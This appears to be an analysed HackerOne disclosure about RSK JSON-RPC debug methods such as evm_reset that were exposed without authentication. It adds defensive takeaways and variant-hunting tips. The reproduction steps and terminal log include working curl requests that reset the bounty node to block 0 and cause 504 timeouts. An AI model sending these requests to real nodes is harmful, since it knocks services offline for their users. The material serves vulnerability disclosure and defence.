# JSON-RPC Debugging Methods Enabled by Default Allow Denial of Service

## Metadata
- **Source:** HackerOne
- **Report:** 324021 | https://hackerone.com/reports/324021
- **Submitted:** 2018-03-09
- **Reporter:** teknogeek
- **Program:** RSK (Rootstock) Bug Bounty
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Denial of Service, Improper Access Control, Debug/Admin Functionality Exposure
- **CVEs:** None
- **Category:** memory-binary

## Summary
Debug JSON-RPC methods such as evm_reset and evm_snapshot were enabled by default without authentication, allowing unauthenticated attackers to invoke state-altering commands. Calling evm_reset caused the node to reset its blockchain state to block 0, hang, and become unresponsive, resulting in complete service disruption.

## Attack scenario
1. Attacker discovers the target is running RSK JSON-RPC endpoint publicly accessible
2. Attacker enumerates available JSON-RPC methods and identifies debug methods like evm_reset, evm_snapshot
3. Attacker crafts a simple POST request with evm_reset method call
4. Node resets its internal state, begins resynchronization, and becomes unresponsive
5. All legitimate requests receive 504 Gateway Timeout errors
6. Node reverts to block 0, requiring full resync and causing extended service outage

## Root cause
Debug and testing JSON-RPC methods (evm_reset, evm_snapshot) were enabled by default in production without authentication checks or authorization controls. These methods should only be available in development/test environments with explicit authentication.

## Attacker mindset
Opportunistic attacker discovering exposed debug functionality through source code analysis or method enumeration. Low technical barrier - simple HTTP POST request causes maximum impact on service availability.

## Defensive takeaways
- Never enable debug/testing RPC methods in production environments
- Require explicit authentication and authorization for all admin/debug functionality
- Implement strict access controls on JSON-RPC endpoints; whitelist allowed methods per user role
- Separate debug endpoints from production endpoints and restrict network access
- Use environment-based configuration to completely disable testing methods in production builds
- Add rate limiting and request throttling to sensitive operations
- Monitor and alert on unusual RPC method invocations (evm_reset, evm_snapshot)
- Implement request validation to reject malformed or unauthorized method calls early

## Variant hunting
Check for other debug methods exposed: evm_revert, evm_mine, evm_increaseTime, debug_*, personal_* methods
Test other blockchain RPC nodes for similar debug endpoint exposure (Geth, Parity, etc.)
Look for unprotected state-modifying methods in other RPC implementations
Audit internal RPC methods that may reset state, clear caches, or trigger expensive operations
Search for methods accessible without authentication in similar web3 implementations

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1526 - Exposure of Sensitive Information to an Unauthorized Actor
- T1078 - Valid Accounts (lack of authentication requirement)
- T1561 - Disk Wipe
- T1499 - Endpoint Denial of Service

## Notes
This is a critical operational security issue. Debug methods like evm_reset that modify critical state should never be available on production infrastructure. The fact that a single unauthenticated request could reset the entire blockchain state to genesis demonstrates inadequate security hardening. RSK should have immediately disabled these methods on public nodes and implemented authentication for any remaining debug functionality.

## Full report
<details><summary>Expand</summary>

**Summary:** Upon sending the JSON-RPC the `evm_reset` command, the RPC server hung, has gone slow, and is now on block 0.

**Description:** While testing the bounty RPC node, I was sending a variety of available commands I noticed in the source code. After sending the `evm_reset` command, the server hung, began responding slowly, started returning `504 Gateway Time-out`'s, and is now synced to block 0.

## Steps To Reproduce:

1. Run `curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": {}, "id":1337}' https://bounty-node.rsk.co` and observe the block number
2. Run `curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":1337}' https://bounty-node.rsk.co`
3. Response should hang

## Supporting Material/References:
Below are snippets from my terminal session while I discovered this issue:

```
# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:14:19]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"0x437ca"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:29:37]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_snapshot", "params": {}, "id":666}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":666,"result":"0x1"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:35:46]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_snapshot", "params": {}, "id":666}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":666,"result":"0x2"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:35:52]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}' https://bounty-node.rsk.co


^C
# teknogeek at teknogeek-mbp in ~ [18:41:34]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"web3_clientVersion", "params": {}, "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"RskJ/0.4.0/Linux/Java1.8/BAMBOO-1192882"}

# teknogeek at teknogeek-mbp in ~ [18:41:37]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"web3_clientVersion", "params": {}, "id":1337}' https://bounty-node.rsk.co
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>

# teknogeek at teknogeek-mbp in ~ [18:45:27]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"0x0"}
```

I also tested from multiple locations (VPS and locally) to confirm that this was not just a IP blacklist or connectivity issue on my end.

## Impact

Loss of service and responsiveness to all users

</details>

---
*Analysed by Claude on 2026-05-24*
